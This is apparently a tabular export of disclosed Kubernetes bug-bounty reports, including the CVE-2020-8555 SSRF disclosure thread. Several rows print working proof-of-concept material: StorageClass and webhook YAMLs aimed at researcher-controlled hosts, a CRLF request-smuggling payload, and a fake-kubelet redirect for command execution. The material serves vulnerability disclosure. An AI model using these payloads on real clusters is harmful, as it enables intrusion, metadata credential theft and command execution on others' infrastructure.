3 attachments:F1361455: poc.shF1361456: ingress.yamlF1361457: output.png",https://hackerone.com/reports/1249583,California,United States,San Francisco,2021,7,1,22,51
Kubernetes,251-500,0.0,200m-1b,$250.00,Medium,5.3,Violation of Secure Design Principles,Broken link hijacing in https://kubernetes-csi.github.io/docs/drivers.html,"tendermint  submitted a report to Kubernetes.May 30th (about 1 year ago)Summary : When a web application has any pages, sources, links to external 3rd party services and are broken then the attacker can claim those endpoints to successfully conduct the attack and claim those endpoints on behalf of the target website and impersonate his identity.
Steps To Reproduce
1) visit https://kubernetes-csi.github.io/docs/drivers.html
2) search for DriveScale
3) click on that link
4) you will be redirected to github and it shows 404
5) change your username to  DriveScale
6) create k8s-plugins repository
7) When someone clicks on DriveScale link they will be redirected to attacker repository
References
https://hackerone.com/reports/1031321
https://hackerone.com/reports/1117079
https://edoverflow.com/2017/broken-link-hijacking/
For POC I have attached video
Impact
The user will install wrong CSI driver which leads to impersonation attack. The attacker can install Ransomware, trojan etc.1 attachment:F1320056: kubernetes_github_account_hijack_may_30.mp4",https://hackerone.com/reports/1212853,California,United States,San Francisco,2021,5,30,4,22
Kubernetes,251-500,0.0,200m-1b,$100.00,Low,2.0,Improper Access Control - Generic,Broken Link Hijacking on kubernetes.io Documentation,nan,https://hackerone.com/reports/1331361,California,United States,San Francisco,2021,9,6,17,19
Kubernetes,251-500,0.0,200m-1b,$500.00,Medium,6.6,Authentication Bypass Using an Alternate Path or Channel,Compromise of auth via subset/superset namespace names.,"alex_orange  submitted a report to Kubernetes.Jan 21st (3 years ago)Report Submission Form
Summary:
Use of nginx.ingress.kubernetes.io/auth* annotations results in a file named {namespace}-{ingress}.passwd. If user knows the namespace and ingress of an ingress they want to compromise they need to be able to create a namespace that is some subset of {namespace}-{ingress}. Then they create an ingress with the remainder of the name and a passwd file of their choosing, this overwrites the other namespace's passwd file and effectively removes the auth layer provided by nginx ingress.
Kubernetes Version:
$ kubectl version
Client Version: version.Info{Major:""1"", Minor:""16+"", GitVersion:""v1.16.5-beta.0"", GitCommit:""224be7bdce5a9dd0c2fd0d46b83865648e2fe0ba"", GitTreeState:""archive"", BuildDate:""2019-12-31T22:42:08Z"", GoVersion:""go1.12.13"", Compiler:""gc"", Platform:""linux/amd64""}
Server Version: version.Info{Major:""1"", Minor:""16"", GitVersion:""v1.16.2"", GitCommit:""c97fe5036ef3df2967d086711e6c0c405941e14b"", GitTreeState:""clean"", BuildDate:""2019-10-15T19:09:08Z"", GoVersion:""go1.12.10"", Compiler:""gc"", Platform:""linux/amd64""}
Installed via kubeadm on gentoo (though I don't think this is relevant to vulnerability).
Component Version:
quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.26.1
Steps To Reproduce:

Install nginx ingress
Create namespace a and ingress b-c within a with an auth annotation.
Create namespace a-b and ingress c within a-b with an auth annotation that overrides the passwd file from #2.
Auth to ingress on a/b-c is now governed by the htpasswd file generated for a-b/c.

Suggested Resolution:

Change line 141 of internal/ingress/annotations/auth/main.go to %v/%v/%v.
Create folder to go along with.
Check that the folder and file will actually be in the right location (.. is allowed as a namespace).

Impact
Attacker can override the htpasswd file of another ingress effectively neutralizing the http authentication.",https://hackerone.com/reports/778803,California,United States,San Francisco,2020,1,21,6,10
Kubernetes,251-500,0.0,200m-1b,"$1,100.00",Medium,6.8,None,Compromise of node can lead to compromise of pods on other nodes,"wtm  submitted a report to Kubernetes.May 1st (3 years ago)Hi Kubernetes team, 
Summary:
If an attacker manages to escape a (eg. privileged) container and gains access to the underlying node it can replace the Kubelet process listening on port 10250/10255 on the node. A fake Kubelet server issueing 301 redirects can trick 'kubectl' (or other clients) into issueing commands against a other pods in the cluster.  This attack bypasses firewalling configurations where nodes cannot talk directly to eachother on port 10250/10255 and also works when port 10250 requires authentication since kubectl is happy to resend the Authorization header / bearer token when a 301redirect is received. 
Kubernetes Version:
1.14.10
Component Version:
kubelet/kubectl
Steps To Reproduce:

Attacker escapes container 
Attacker issues a 'kill -9 pidof kubelet; python fakekubet.py  (see attachment)
Attacker waits for a /exec request coming in to the fakekubelet.py server, and redirects it (with an arbitrary command) to another node.  

Example exec request for 'hello-app'  by kubectl:
10.138.0.10 - - [01/May/2020 11:28:55] ""POST /exec/default/hello-server-7f8fd4d44b-j5rsc/hello-app?command=%2Fbin%2Fs&input=1&output=1&tty=1 HTTP/1.1"" 307 - 
Example response by the fakekubelet:
HTTP/1.1 301 Redirect
Location: https://10.138.0.8/exec/default/victim-67c59cd9f4-vm5dl/nginx?command=/bin/arbitrary_command_here&error=1&input=1&output=1&tty=0

kubectl follows the redirect and contacts the victim node, requesting /exec as specified by fakekubelet.py (can also redirect to 'master')
arbitrary command is executed on the victim node

Supporting Material/References:
attachment 1:  fakekubelet.py
attachment 2: ugly_diagram.png
related Kubelet code: https://github.com/kubernetes/kubernetes/blob/4a6935b31fcc4d1498c977d90387e02b6b93288f/pkg/kubelet/server/server.go#L257-L263
I hope this helps!
Kind regards,
Offensi.com
Wouter ter Maat
Impact
execute arbitrary command in victim's pod2 attachments:F810873: fakekubelet.pyF810906: ugly_diagram.png",https://hackerone.com/reports/863979,California,United States,San Francisco,2020,5,1,12,26
Kubernetes,251-500,0.0,200m-1b,"$2,500.00",High,8.8,Server-Side Request Forgery (SSRF),Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.,"reeverzax  submitted a report to Kubernetes.Jan 15th (3 years ago)Hello,
Who we are :
We’re two French security researchers and our respective names are Brice Augras and
Christophe Hauquiert, we worked and found the vulnerability together.
Brice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax
Christophe Hauquiert - https://hackerone.com/hach
Summary
We recently led some security investigations about Kubernetes product hosted in a managed
service.
By abusing product vulnerability due to implementation context, we would like to bring to your
attention technical details about what we found.
We started an investigation process on multiple managed k8s offers and found quite each time a Critical
Impact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .
We're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  
Technical specification :

Fake vendor name : example.com
Kubernetes release for half-blind SSRF scenario: 1.14
Kubernetes release for complete SSRF vulnerability :  up to v1.15.3, v1.14.6 and v1.13.10

We don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. 

Attacker server: https://bzh.ovh (51.38.238.22)
Provided file with proof of concept scripts: PoC.zip

PoC.zip (F685902)
Compromission Scenario
Here is the main workflow we followed in order to escape from our customer environment on multiple distributors
providing k8s managed offer.
Firstly, we created a k8s cluster on distributors managed k8s service.
Mainly, these vendors use the following infrastructure : 
Image F685875: screen2.png 36.20 KiBZoom in Zoom out Copy Download
After configuring kubectl binary, we were able to manage our customer cluster provided by example.com
When creating a persistent volume claim associated with a custom StorageClass on our
cluster, the provisioning step is handled by the kube/cloud controller manager (depending of the release),
we noticed that the process was handled  inside vendor internal perimeter.
We discovered the existence of a half-blind SSRF vulnerability inside multiple
StorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.
This half-blind SSRF can be used us to scan master VPC network and request the different listening services
(Metadata instance, Kubelet, ETCD, etc..) based on the kube-controller responses.
Initially, we were only limited to HTTP POST requests as we were unable to retrieve content of
body page if the response code was equal to 200 and not in JSON Content-Type.
But we improved our first payload by combining the previous step with a 302 redirect from an
external server in order to convert POST request to GET request.
In addition to this, if the managed k8s offer service provider was using an old k8s cluster release AND allowed customer kube-controller-manager logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.
This was the attack scenario with the most impact.
Indeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...
PoC
PoC n°1 - Half Blind SSRF
While doing some analysis on glusterFS storage Class Golang source, we noticed that
the first HTTP request issued during a Volume creation
(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), /volumes
was appended at the end of the user provided URL in resturl parameter.
In order to remove the end of this unwanted path, we used the # trick in the resturl
parameter.
Here is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:
Code 690 BytesWrap lines Copy Download1apiVersion: storage.k8s.io/v1
2kind: StorageClass
3metadata:
4name: poc-ssrf
5provisioner: kubernetes.io/glusterfs
6parameters:
7resturl: ""http://bzh.ovh:6666/#""
8clusterid: ""630372ccdc720a92c681fb928f27b53f""
9restauthenabled: ""true""
10restuser: ""admin""
11secretNamespace: ""default""
12secretName: ""poc-ssrf-secret""
13gidMin: ""40000""
14gidMax: ""50000""
15volumetype: ""replicate:3""
16---
17apiVersion: v1
18data:
19key: bXlwYXNzd29yZA==
20kind: Secret
21metadata:
22name: poc-ssrf-secret
23namespace: default
24type: kubernetes.io/glusterfs
25---
26apiVersion: v1
27kind: PersistentVolumeClaim
28metadata:
29name: poc-ssrf
30spec:
31accessModes:
32- ReadWriteOnce
33volumeMode: Filesystem
34resources:
35requests:
36storage: 8Gi
37storageClassName: poc-ssrf
We executed the payload with kubectl binary, and the kube-controller-manager handled the
creation process and HTTP request:
Code 28 BytesWrap lines Copy Download1kubectl create -f sc-poc.yam
The attacker server was put in listening mode on port 6666 in order to handle incoming
POST requests and verify that how the URL could be arbirary controlled by an attacker:
Image F685801: screen1.png 54.21 KiBZoom in Zoom out Copy Download
PoC n°2 : Redirecting POST to GET HTTP request trick
The first request issued by Glusterfs client was a POST type, by doing the following steps,
we were able to convert POST request to GET:
• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter
• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the
following Location Header http://169.254.169.254 (could be any other internal
resource, this redirected url is used for example purposes)
• As by default Golang net/http library follows redirection and convert POST to GET
with 302 return code, the targeted resource is then requested with a HTTP GET request.
We were able to read HTTP response body on some requests by describing persistent
volume claim object:
Code 24 BytesWrap lines Copy Download1kubectl describe pvc xxx
Or, getting events from Kubernetes cluster with command below:
Code 17 BytesWrap lines Copy Download1kubectl get event
Here is an example of JSON response we were able to retrieve : 
Image F685919: json_response.png 36.91 KiBZoom in Zoom out Copy Download
The exploitation process of our vulnerability at this moment was limited due to the
following elements:

We were not able to inject HTTP headers in the emitted request
We were not able to perform POST HTTP Request with body parameters (useful to
request key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)
We were not able to retrieve response body content when HTTP return code was
200 and not a JSON Content-Type response.

PoC n°3 : Managed cluster Lan scanning and sensitive data exposure
At least, as we had the possibility to scan LAN resources, the next step was automation.
Indeed, in order to scan one IP address and one port we had to realize the following tasks:

Delete previous tested Storage Class
Delete previous tested Persistent Volume Claim
Change IP and PORT in sc.yaml
Create Storage Class with new IP and port
Create new Persistent Volume Claim
Since the way to scan for one resource was very specific and incompatible with traditional
SSRF exploitation tools or scanners, we decided to create some kind of custom workers in
bash script.
In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.
The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range.


Each worker was launched the following command:
Image F685904: worker.png 85.77 KiBZoom in Zoom out Copy Download
Here are two additional YAML files that needs to be in the same directory as scanner.sh Bash
script:
Code 353 BytesWrap lines Copy Download1apiVersion: storage.k8s.io/v1
2kind: StorageClass
3metadata:
4name: {{SC_NAME}}
5provisioner: kubernetes.io/glusterfs
6parameters:
7resturl: ""http://{{URL}}#""
8clusterid: ""630372ccdc720a92c681fb928f27b53f""
9restauthenabled: ""true""
10restuser: ""admin""
11secretNamespace: ""default""
12secretName: ""heketi-secret""
13gidMin: ""40000""
14gidMax: ""50000""
15volumetype: ""replicate:3""
Above is the content of template_sc.yaml
Code 193 BytesWrap lines Copy Download1apiVersion: v1
2kind: PersistentVolumeClaim
3metadata:
4name: {{PVC_NAME}}
5spec:
6accessModes:
7- ReadWriteOnce
8volumeMode: Filesystem
9resources:
10requests:
11storage: 8Gi
12storageClassName: {{SC_NAME}}
Above is the content of template_pvc.yaml
PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases
In addition to all the previous steps, we found a more efficient way to retrieve full HTTP
response body content in addition to craft complete HTTP requests that were user controlled.
Unfortunately, the vulnerability requires the following prerequisites:

Kube Controller Manager logs reachable by the customer
Kubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)

We still wan't to bring this attack scenario with a PoC as some providers still have some
customers using one of these “deprecated” k8s release.
We realized a first PoC in a local environment to demonstrate the vulnerability.
Here are some technical details about them:
We discovered a vulnerability was existing for the following Golang releases <1.12
(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF
attacks.
By combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete
crafted requests, including custom headers, HTTP method, parameters and data that were
going to be executed by the kube-controller-manager.
In addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. 
We deployed a local environment simulating Kubernetes exchanges between the GlusterFS
Go client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).
Here is an example of a working StorageClass resturl parameter payload performing an HTTP
smuggling attack + CRLF during provisioning step in order to leak response content in kube-
controller logs:
Here is an example of a working StorageClass resturl parameter payload allowing to perform this kind of attack scenario : 
Code 181 BytesWrap lines Copy Download1http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-
2alive\r\nHost: 172.31.X.1:10255\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: 172.31.X.1:10255\r\n\r\n
Here is the complete HTTP response that was leaking inside the lube-controller-manage logs :
Image F685896: CRLF.png 100.66 KiBZoom in Zoom out Copy Download
Impact
Impact Analysis
This was quite hard for us to evaluate how hard the impact was for these two attack vectors.
Indeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.
Feel free to exchange with us about the CVSS score about you consider for this vulnerability as this seems to be related to managed context k8s environment.
From the various distributors we led research on, we noticed that this could lead to  the following impact analysis : 
Integrity

Lateral movement with cloud steal credentials (from metadata API)
Remote command execution by using these credentials
Reproducing above scenario in an IDOR way with other resources discovered in LAN area.

Confidentiality

Information gathering by LAN scannin (ssh version, http server versions, ...)
Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)
Customers data leak, by using cloud credentials

Availability
All the post-exploitation scenarios about integrity attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. 
Indeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.
Best Regards, 
Brice Augras from @Groupe-Asten
Christophe Hauquiert6 attachments:F685801: screen1.pngF685875: screen2.pngF685896: CRLF.pngF685902: PoC.zipF685904: worker.pngF685919: json_response.pngreeverzax   invited another hacker as a collaborator. Jan 15th (3 years ago)hach   joined this report as a collaborator. Jan 15th (3 years ago)h1_analyst_leon HackerOne triage  changed the status to Triaged. Jan 16th (3 years ago)Thank you @reeverzax! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.reeverzax   posted a comment. Jan 16th (3 years ago)Hello @tuxedo, 
nice to meet you.
Thanks for triage and about severity we completely understand that this is not the final version as we're bringing to your attention a quite tricky situation where the impact is related to the third actor (the hosting company).
Feel free to reach us if you wan't additional information about this. 
Have a nice day. 
@reeverzax  & @hach tallclair Kubernetes staff  posted a comment. Jan 16th (3 years ago)Thank you for your report. As you mention, the remediation and mitigations of this are complicated due to the dependence on the cluster setup and external environment. We would like to have a longer embargo timeline on this than usual while we coordinate with distributors. We are already coordinating with the Google Cloud and AWS teams. We're currently targeting a mid-March announcement. Are you comfortable with this timeline?
Tim Allclair, on behalf of the Kubernetes Product Security Committeereeverzax   posted a comment. Jan 21st (3 years ago)Hello @tallclair , 
nice to meet you and sorry for the delay.
We're completely comfortable with the timeline you requested as we understand that the coordination process with all distributors will represent an important process to handle.
Feel free to give us updates if you need any additional information :)
Best Regards, 
Brice & Christophereeverzax   posted a comment. Mar 3rd (3 years ago)Hello @tallclair, 
we're getting in touch with you in order to know if you have any news to bring to our attention regarding this case ? 
Thank you and have a nice day :)
Sincerely, 
Brice & Christophelhinds Kubernetes staff  posted a comment. Mar 4th (3 years ago)Hi @reeverzax ,
I can see this case is being finalised internally over the past 24 hours, so hold tight and we will summarise shortly for you!
LukeKubernetes  rewarded hach with a $2,500 bounty. Mar 4th (3 years ago)Thanks again for the report. We've decided to award this as a Tier 1 High severity vulnerability. I'm afraid we don't have any updates on resolution or disclosure timelines yet.Kubernetes  rewarded reeverzax with a $2,500 bounty. Mar 4th (3 years ago)Thanks again for the report. We've decided to award this as a Tier 1 High severity vulnerability. I'm afraid we don't have any updates on resolution or disclosure timelines yet.tallclair Kubernetes staff  updated CVE reference to CVE-2020-8555. Mar 4th (3 years ago)reeverzax   posted a comment. Mar 4th (3 years ago)Hello, Wow that's a really great news !
Thank you for your feedback and the reward :D ! 
This is quite a complicated case for us as there are multiple companies involved in it. That's the reason why we would like to ask you the following question : 
Are we allowed, without giving details, to answer to the companies we were initially in relation with that there is no ""updates on resolution or disclosure timelines yet""  and that they should try to get in touch with Kubernetes Product Security Committee if they wan't to have more specific details ? 
Obviously, since you triaged the vulnerability, we stopped our investigations on the other hosting providers that might be concerned about the root vulnerability.
Once again, thank you very much and have a nice day. 
Best Regards, 
Brice & Christophe. tallclair Kubernetes staff  posted a comment. Mar 4th (3 years ago)Yes, please do. They can use CVE-2020-8555 to disambiguate when inquiring about this, and reach out to security-discuss-private@kubernetes.io
Thanks!tallclair Kubernetes staff  posted a comment. Apr 6th (3 years ago)The public announcement date for this has been set at June 1st. We've notified our distributors list, and are giving them extra time to patch due to the complexity of the fixes and the current global situation.reeverzax   posted a comment. May 22nd (2 years ago)Hello Tim Allclair, 
Hope everything is ok on your side and you're in good health condition. 
We're getting in touch with you in order to know if 1st June is still ok regarding public disclosure on your side (and distributors too) ? 
In addition, Hugues Masselin from HackerOne got in touch with us recently asking us to answer a few questions for their incoming EMEA marketing planned campaign where we're supposed to give testimony as French Elite Hackers :

What is the most impactful bug you have found? 
What was your process for finding it?
What could the consequences have been had the bug been exploited?
 How common are bugs like these? 
What are your favourite type of bugs to find? 
What should companies be most concerned about? 

Through this campaign that will be broadcasted after the 1st of June (we can provide a written acknowledge from HackerOne team), we would like to know if we can freely talk about our research work on Kubernetes security bug (specially for the first three questions).
We already got an approval from Microsoft as a part of this research project was made in their managed service perimeter. 
In addition to this, we're now working on a technical write up on medium about our research work. Would you like us to provide you the draft link before any public disclosure ? 
Have a nice day. 
Best Regards, 
Brice & Christophe.tallclair Kubernetes staff  posted a comment. May 28th (2 years ago)@reeverzax - Sorry for the delayed response. Yes, we are still planning a public announcement on June 1st, around 9am PT. Please watch https://groups.google.com/g/kubernetes-security-announce for the announcement and do not publish anything before the announcement is made. You may freely discuss the vulnerability, but we would appreciate a draft of the technical details before publishing.
How would you like to be credited? I currently have:
Brice Augras from Groupe-Asten, Christophe Hauquierttallclair Kubernetes staff  posted a comment. May 28th (2 years ago)FYI, we've decided to drop the integrity impact to none, which downgrades this to a medium (https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N).
Here is a pre-release draft of our planned announcement issue:

TITLE: CVE-2020-8555: Half-Blind SSRF in kube/cloud-controller-manager
CVSS Rating: CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N
There exists a Server Side Request Forgery (SSRF) vulnerability in kube-controller-manager that allows certain authorized users to leak up to 500 bytes of arbitrary information from unprotected endpoints within the master's host network (such as link-local or loopback services).
An attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.
Am I vulnerable?
You may be vulnerable if:

You are running a vulnerable version (see below)
There are unprotected endpoints normally only visible from the Kubernetes master (including link-local metadata endpoints, unauthenticated services listening on localhost, or other services in the master's private network)
Untrusted users can create pods with an affected volume type or modify storage classes.

Affected Versions

kube-controller-manager v1.18.0
kube-controller-manager v1.17.0 - v1.17.4
kube-controller-manager v1.16.0 - v1.16.8
kube-controller-manager < v1.15.11

The affected volume types are: GlusterFS, Quobyte, StorageFS, ScaleIO
How do I mitigate this vulnerability?
Prior to upgrading, this vulnerability can be mitigated by adding endpoint protections on the master or restricting usage of the vulnerable volume types (for example by constraining usage with a PodSecurityPolicy or third-party admission controller such as Gatekeeper) and restricting StorageClass write permissions through RBAC.
Fixed Versions
The information leak was patched in the following versions:

kube-controller-manager master - fixed by https://github.com/kubernetes/kubernetes/pull/89794
kube-controller-manager v1.18.1+ - fixed by https://github.com/kubernetes/kubernetes/pull/89796
kube-controller-manager v1.17.5+ - fixed by https://github.com/kubernetes/kubernetes/pull/89837
kube-controller-manager v1.16.9+ - fixed by https://github.com/kubernetes/kubernetes/pull/89838
kube-controller-manager v1.15.12+ - fixed by https://github.com/kubernetes/kubernetes/pull/89839

To upgrade, refer to the documentation: https://kubernetes.io/docs/tasks/administer-cluster/cluster-management/#upgrading-a-cluster
Additional Details
Optional details:

Vulnerability background
Technical explanation of vulnerability and/or fix
Reproduction steps (avoid disclosing unnecessary details)

Acknowledgements
This vulnerability was reported by Brice Augras from Groupe-Asten and Christophe Hauquierthach   posted a comment. May 28th (2 years ago)Hi @tallclair 
Thank you for your response, actually we are still working on the write-up but we can already share a first draft of our work : https://medium.com/@BreizhZeroDayHunters/draft-brice-christophe-publication-1er-juin-technique-8f6b448eafa8
It's not 100% done yet but the different chapters were written done.
Grammar checking + last complete review will be done this week-end so we should be ready for Monday 1st June.
Of course we will wait the announcement before publishing anything.
About credit can you add ""from Nokia"" after my name ?
This vulnerability was reported by Brice Augras from Groupe-Asten and Christophe Hauquiert from Nokia
Brice & Christophe.tallclair Kubernetes staff  posted a comment. Updated May 29th (2 years ago)Hi @hach, thanks for sharing your draft. I've updated our draft issue to credit you as from Nokia.hach   posted a comment. May 29th (2 years ago)Hi @tallclair 
We have additional questions about the CVE draft you sent : 


Code 308 BytesWrap lines Copy Download1An attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.


Code 338 BytesWrap lines Copy Download1When we exploited the vulnerability we never needed to create a pod, we just created a malicious storageclass with a PVC using it and that was enough to trigger a dynamic volume provisioning workflow. So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?
2
3- Same question about
Untrusted users can create pods
Code 3 BytesWrap lines Copy Download1and
(for example by constraining usage with a PodSecurityPolicy
Code 477 BytesWrap lines Copy Download1Our understanding of PodSecurityPolicy is that it only restricts pod creation/edition process  and not PersistentVolumeClaim resource.  We also read in the documentation ""Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim"". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.
2
3Brice & Christophehach   posted a comment. Jun 1st (2 years ago)Hi @tallclair,
We finished to write our writeup : https://medium.com/@BreizhZeroDayHunters/when-its-not-only-about-a-kubernetes-cve-8f6b448eafa8
We are now waiting for CVE disclosure and we will wait your approval to publish.
Regards,
Brice & Christophetallclair Kubernetes staff  posted a comment. Jun 1st (2 years ago)FYI, announcement is live: https://groups.google.com/d/msg/kubernetes-security-announce/kEK27tqqs30/49XlMZ81AwAJ

When we exploited the vulnerability we never needed to create a pod, we just created a malicious storageclass with a PVC using it and that was enough to trigger a dynamic volume provisioning workflow. So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?

Creating a StorageClass is generally considered higher privilege than creating a pod. Our team was able to identify a path to exploit from a pod, but we're not sharing the details right now.

Our understanding of PodSecurityPolicy is that it only restricts pod creation/edition process and not PersistentVolumeClaim resource. We also read in the documentation ""Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim"". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.

Similarly, creating PVs is typically designated to an admin, so a PSP is a way of preventing less privileged users from exploiting this.reeverzax   posted a comment. Jun 1st (2 years ago)Hello Tim,
Thank you very much for this technical feedback :) We know better understand the fixing solutions. 
We would like to know if it's possible for you to add the Acknowlegdment part on the Google groups announce?
Thank you  and have a nice day ! tallclair Kubernetes staff  posted a comment. Jun 2nd (2 years ago)The acknowledgement got dropped in an effort to make our announcement emails more concise and streamlined, but I think this was a mistake, and will add it back to our template. That said, because of how widely the email is distributed, I don't want to send the correction on it's own. If there is a follow up, I will include the acknowledgement, and will also add the acknowledgement to the security-discuss thread.tallclair Kubernetes staff  posted a comment. Jun 2nd (2 years ago)https://groups.google.com/d/msg/kubernetes-security-discuss/J24-PpPXRQ0/O0_lHfLTAgAJtallclair Kubernetes staff  closed the report and changed the status to Resolved. Jul 15th (2 years ago)Closing this as resolved since the CVE is published, and the initial mitigations are in place. We have more mitigations that are being added, probably in the August release.tallclair Kubernetes staff  requested to disclose this report. Oct 30th (2 years ago)reeverzax   agreed to disclose this report. Oct 30th (2 years ago)We're very glad about how the vulnerability was handled. Once again, thanks for all :)  This report has been disclosed. Oct 30th (2 years ago)",https://hackerone.com/reports/776017,California,United States,San Francisco,2020,1,15,22,33
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.8,Deserialization of Untrusted Data,Loading YAML in Java client can lead to command execution,"j0v  submitted a report to Kubernetes.Apr 18th (2 years ago)Summary by j0vI wrote a small post about this report on my blog, you can find it here: https://j0vsec.com/post/cve-2021-25738/",https://hackerone.com/reports/1167773,California,United States,San Francisco,2021,4,18,13,12
Kubernetes,251-500,0.0,200m-1b,$500.00,Medium,6.2,Cleartext Storage of Sensitive Information,secret leaks in vsphere cloud controller manager log,"derek0405  submitted a report to Kubernetes.Aug 25th (2 years ago)Report Submission Form
Summary:
When create k8s cluster over vsphere and enable vsphere as cloud provider. With logging level set to 4 or above, secret information will be printed out in the cloud controller manager's log.
Kubernetes Version:
1.18.6
Component Version:
legacy cloud provider
Steps To Reproduce:
[add details for how we can reproduce the issue, including relevant cluster setup and configuration]

Configure vsphere as cloud provider and set logging level to 4 or above (https://cloud-provider-vsphere.sigs.k8s.io/tutorials/kubernetes-on-vsphere-with-kubeadm.html)
Check vsphere cloud provider log when a secret is created or udpated as the secret informer is registered with and will be print out when the logging level set to 4 or above.

Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]
Source codes that print out the secret info:
https://github.com/kubernetes/kubernetes/blob/6d0f4749a59099171540d4fd7c9523b029e71ceb/staging/src/k8s.io/legacy-cloud-providers/vsphere/vsphere.go#L1503
https://github.com/kubernetes/kubernetes/blob/6d0f4749a59099171540d4fd7c9523b029e71ceb/staging/src/k8s.io/legacy-cloud-providers/vsphere/vsphere.go#L1527
Calling code path:
1.cmd/kube-controller-manager/app/controllermanager.go -> Run()
2.cmd/kube-controller-manager/app/controllermanager.go -> CreateControllerContext()
3. cmd/kube-controller-manager/app/cloudproviders.go -> createCloudProvider()
4. vendor/k8s.io/cloud-provider/cloud.go ->SetInformers()
5. staging/src/k8s.io/legacy-cloud-providers/vsphere/vsphere.go -> func (vs *VSphere) SetInformers(informerFactory informers.SharedInformerFactory)

[attachment / reference]

Impact
If any kubernetes users or service accounts has privileges (e.g. GET pods/log  in the kube-system namespace), he will be able to view all the secrets data when a secret is created or updated which may contain sensitive data such as password or private key. Further, is the secret is a service account token, then the user may escalate his privileges.",https://hackerone.com/reports/966383,California,United States,San Francisco,2020,8,25,0,29
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.8,Server-Side Request Forgery (SSRF),SSRF for kube-apiserver cloudprovider scene,"lazydog  submitted a report to Kubernetes.Jul 24th (2 years ago)Report Submission Form
Summary:
attacker can create admissionwebhook cause ssrf in cloudprovider server.
cloudprovider like GKE AKS EKS.
Kubernetes Version:
kubernetes v1.18.6
Component Version:
Docker version 19.03.6, build 369ce74a3c
Steps To Reproduce:

use follwing command create v1.18.6 kubernetes, wait for the download  process done. 

minikube start --vm-driver=none --kubernetes-version='v1.18.6'
2.edit kube-apiserver options in following path.
Code 147 BytesWrap lines Copy Download1/etc/kubernetes/manifests/kube-apiserver.yaml
2
3add some options to  spec.containers.command field.  see pic1
4--log-dir=/var/log
5--logtostderr=false
Image F920720: pic1.png 66.22 KiBZoom in Zoom out Copy Download
3.save following yaml file to disk as poc1.yaml, and run command kubectl create poc1.yaml.
poc1.yaml 
Code 585 BytesWrap lines Copy Download1apiVersion: admissionregistration.k8s.io/v1
2kind: ValidatingWebhookConfiguration
3metadata:
4  name: test.config.xxx.io
5webhooks:
6- name: test.config.xxx.io
7  rules:
8  - apiGroups:   [""""]
9    apiVersions: [""v1"", ""v1beta1""]
10    operations:  [""CREATE"",""DELETE"",""UPDATE""]
11    resources:   [""serviceaccounts""]
12    scope:       ""*""
13  clientConfig:
14    # modify with your poc2 webserver
15    url: ""https://lazydog.me/aa""
16    # if webserver using self-signed certificate must be add caBundle
17    # caBundle: """"
18  admissionReviewVersions: [""v1"", ""v1beta1""]
19  sideEffects: None
20  timeoutSeconds: 5
4.use pip install Flask to install flask deps, and run FLASK_ENV=development FLASK_APP=poc1 flask run. if you using self-signed certificate must be add --cert PATH --key PATH arguments to command.
poc2.py
Code 401 BytesWrap lines Copy Download1from flask import Flask, redirect, request, Response
2
3app = Flask(__name__)
4
5app.port = 80
6
7
8@app.route('/<path:path>', methods=['POST','GET'])
9def index(path=''):
10    resp = ''
11    print(request.headers)
12    if path == 'test':
13        res = Response(""test"")
